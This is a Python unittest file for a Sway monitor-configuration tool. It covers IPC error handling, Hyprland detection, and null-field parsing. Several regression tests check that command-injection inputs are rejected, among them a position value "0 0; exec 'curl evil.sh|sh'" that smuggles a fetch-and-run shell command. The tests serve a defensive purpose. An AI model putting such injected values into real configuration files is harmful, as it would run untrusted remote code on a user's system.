import unittest
from unittest.mock import MagicMock, patch
import sys
import os

sys.path.append(os.getcwd())

from ezsway.core.wm_adapter import SwayAdapter, WMFactory, HyprlandAdapter
from ezsway.core.errors import EzSwayError, InvalidWMParameterError, WMCommandError, WMNotSupportedError


class TestSwayAdapterCommandChecking(unittest.TestCase):
    """Regression tests for the previously-silent IPC-reply-ignoring bug:
    SwayAdapter._run_command() used to fire i3ipc commands and never check
    the reply's success/error fields, so a rejected command (bad mode, bad
    transform, monitor gone) failed completely silently."""

    def setUp(self):
        with patch("ezsway.core.wm_adapter.i3ipc.Connection"):
            self.adapter = SwayAdapter()
        self.adapter.ipc = MagicMock()

    def test_successful_command_does_not_raise(self):
        reply = MagicMock(success=True, error=None)
        self.adapter.ipc.command.return_value = [reply]
        self.adapter.enable_output("DP-1", mode="1920x1080", position="0 0")  # should not raise

    def test_rejected_command_raises_wmcommanderror_with_message(self):
        reply = MagicMock(success=False, error="Unknown output DP-1")
        self.adapter.ipc.command.return_value = [reply]
        with self.assertRaises(WMCommandError) as ctx:
            self.adapter.enable_output("DP-1", mode="1920x1080", position="0 0")
        self.assertIn("Unknown output DP-1", str(ctx.exception))

    def test_invalid_transform_rejected_before_reaching_wm(self):
        with self.assertRaises(ValueError):
            self.adapter.enable_output("DP-1", mode="1920x1080", position="0 0", transform="sideways")
        self.adapter.ipc.command.assert_not_called()

    def test_command_injection_via_position_rejected(self):
        """Regression test for a real command-injection vulnerability:
        mode/position/scale were interpolated directly into a raw sway IPC
        command string with zero validation (only transform was checked).
        A profile JSON (attacker-crafted or merely corrupted) with a
        position like "0 0; exec 'curl evil.sh|sh'" reached sway's command
        parser verbatim -- sway supports ';'-separated commands and 'exec'."""
        with self.assertRaises(ValueError):
            self.adapter.enable_output(
                "DP-1", mode="1920x1080",
                position="0 0; exec 'curl evil.sh|sh'",
            )
        self.adapter.ipc.command.assert_not_called()

    def test_command_injection_via_mode_rejected(self):
        with self.assertRaises(ValueError):
            self.adapter.enable_output("DP-1", mode="1920x1080; exec evil", position="0 0")
        self.adapter.ipc.command.assert_not_called()

    def test_command_injection_via_scale_rejected(self):
        with self.assertRaises(ValueError):
            self.adapter.enable_output(
                "DP-1", mode="1920x1080", position="0 0",
                scale="1.0; exec evil",
            )
        self.adapter.ipc.command.assert_not_called()

    def test_command_injection_via_monitor_name_rejected(self):
        with self.assertRaises(ValueError):
            self.adapter.enable_output(
                "DP-1; exec evil", mode="1920x1080", position="0 0",
            )
        self.adapter.ipc.command.assert_not_called()

    def test_out_of_range_scale_rejected(self):
        with self.assertRaises(ValueError):
            self.adapter.enable_output("DP-1", mode="1920x1080", position="0 0", scale=999)
        self.adapter.ipc.command.assert_not_called()

    def test_valid_negative_position_accepted(self):
        """Negative positions are legitimate (an output to the left of/above
        the origin) -- validation must not be so strict it rejects real
        layouts."""
        reply = MagicMock(success=True, error=None)
        self.adapter.ipc.command.return_value = [reply]
        self.adapter.enable_output("DP-1", mode="1920x1080", position="-1920 0")  # should not raise

    def test_valid_transform_included_in_command(self):
        reply = MagicMock(success=True, error=None)
        self.adapter.ipc.command.return_value = [reply]
        self.adapter.enable_output("DP-1", mode="1920x1080", position="0 0", transform="90")
        sent_command = self.adapter.ipc.command.call_args[0][0]
        self.assertIn("transform 90", sent_command)

    def test_ipc_exception_wrapped_as_wmcommanderror(self):
        self.adapter.ipc.command.side_effect = RuntimeError("socket closed")
        with self.assertRaises(WMCommandError):
            self.adapter.disable_output("DP-1")

    def test_get_outputs_ipc_exception_wrapped_as_wmcommanderror(self):
        """Regression test: get_outputs()'s primary i3ipc path used to have
        NO exception handling at all (unlike enable/disable_output), so a
        socket drop mid-session raised a raw, uncatchable exception straight
        through every caller (GUI timer, TUI, CLI)."""
        self.adapter.ipc.get_outputs.side_effect = RuntimeError("broken pipe")
        with self.assertRaises(WMCommandError):
            self.adapter.get_outputs()


class TestWMFactoryHyprland(unittest.TestCase):
    """Regression test: previously a detected Hyprland session silently got a
    stub adapter whose methods all no-op'd (empty monitor list, no error).
    It must now raise clearly instead."""

    def test_hyprland_detected_raises_not_implemented(self):
        # Must be an EzSwayError subclass (WMNotSupportedError), not a bare
        # NotImplementedError -- every caller in this codebase catches
        # `except EzSwayError`, which a bare NotImplementedError would slip
        # past, producing an unhandled traceback instead of a clean message.
        with patch.dict(os.environ, {"HYPRLAND_INSTANCE_SIGNATURE": "abc123"}, clear=False):
            with patch.dict(os.environ, {}, clear=False):
                os.environ.pop("SWAYSOCK", None)
                with self.assertRaises(WMNotSupportedError):
                    WMFactory.create_adapter()

    def test_hyprland_adapter_methods_raise_not_implemented(self):
        adapter = HyprlandAdapter()
        with self.assertRaises(WMNotSupportedError):
            adapter.get_outputs()
        with self.assertRaises(WMNotSupportedError):
            adapter.enable_output("m1", "1920x1080", "0 0")
        with self.assertRaises(WMNotSupportedError):
            adapter.disable_output("m1")


class TestInvalidWMParameterErrorIsBothTypes(unittest.TestCase):
    """Regression test for the design that closes the gap where several
    call sites (activate_monitor, enforce_policy's fail-safe branch, and
    their GUI/TUI/CLI callers) only caught `except EzSwayError` and would
    have let a bare ValueError from the input validators escape uncaught.
    InvalidWMParameterError is deliberately BOTH a ValueError and an
    EzSwayError (multiple inheritance) so every existing handler of either
    type catches it automatically, with no call sites needing to change."""

    def setUp(self):
        with patch("ezsway.core.wm_adapter.i3ipc.Connection"):
            self.adapter = SwayAdapter()
        self.adapter.ipc = MagicMock()

    def test_is_instance_of_both_valueerror_and_ezswayerror(self):
        try:
            self.adapter.enable_output("DP-1", mode="bad-mode", position="0 0")
        except Exception as e:
            self.assertIsInstance(e, ValueError)
            self.assertIsInstance(e, EzSwayError)
            self.assertIsInstance(e, InvalidWMParameterError)
        else:
            self.fail("expected an exception")

    def test_caught_by_bare_except_ezswayerror(self):
        try:
            try:
                self.adapter.enable_output("DP-1", mode="bad-mode", position="0 0")
            except EzSwayError:
                pass  # this is the assertion -- must not fall through uncaught
            else:
                self.fail("expected EzSwayError to be raised")
        except ValueError:
            self.fail("EzSwayError handler did not catch it -- ValueError leaked past it")


class TestSwayAdapterFallbackNullCurrentMode(unittest.TestCase):
    """Regression test: sway reports current_mode as JSON *null* (not an
    absent key) for a disabled/disconnected output. out.get("current_mode",
    {}) only supplies the {} default when the key is missing entirely, so a
    present-but-null value made the chained .get("width", 0) raise
    AttributeError on None -- uncaught by the narrow except clause on this
    fallback path (the primary i3ipc path already guarded this correctly)."""

    def setUp(self):
        with patch("ezsway.core.wm_adapter.i3ipc.Connection", side_effect=Exception("no ipc")):
            self.adapter = SwayAdapter()
        self.assertIsNone(self.adapter.ipc)  # confirms we're exercising the fallback path

    def test_null_current_mode_does_not_crash(self):
        import json
        import subprocess as sp
        fake_stdout = json.dumps([{
            "name": "DP-1", "make": "Dell", "model": "M1", "serial": "S1",
            "current_mode": None, "active": False, "scale": 1.0,
            "rect": {"x": 0, "y": 0},
        }])
        fake_result = MagicMock(stdout=fake_stdout)
        with patch("ezsway.core.wm_adapter.subprocess.run", return_value=fake_result):
            monitors = self.adapter.get_outputs()  # must not raise AttributeError
        self.assertEqual(len(monitors), 1)
        self.assertEqual(monitors[0].width, 0)

    def test_null_rect_does_not_crash(self):
        """Same bug class as current_mode above, for "rect" -- this PR fixed
        it for current_mode but missed the identical shape here in a later
        review round."""
        import json
        fake_stdout = json.dumps([{
            "name": "DP-1", "make": "Dell", "model": "M1", "serial": "S1",
            "current_mode": {"width": 1920, "height": 1080, "refresh": 60000},
            "active": True, "scale": 1.0, "rect": None,
        }])
        fake_result = MagicMock(stdout=fake_stdout)
        with patch("ezsway.core.wm_adapter.subprocess.run", return_value=fake_result):
            monitors = self.adapter.get_outputs()  # must not raise AttributeError
        self.assertEqual(len(monitors), 1)
        self.assertEqual(monitors[0].pos_x, 0)
        self.assertEqual(monitors[0].pos_y, 0)


if __name__ == "__main__":
    unittest.main()
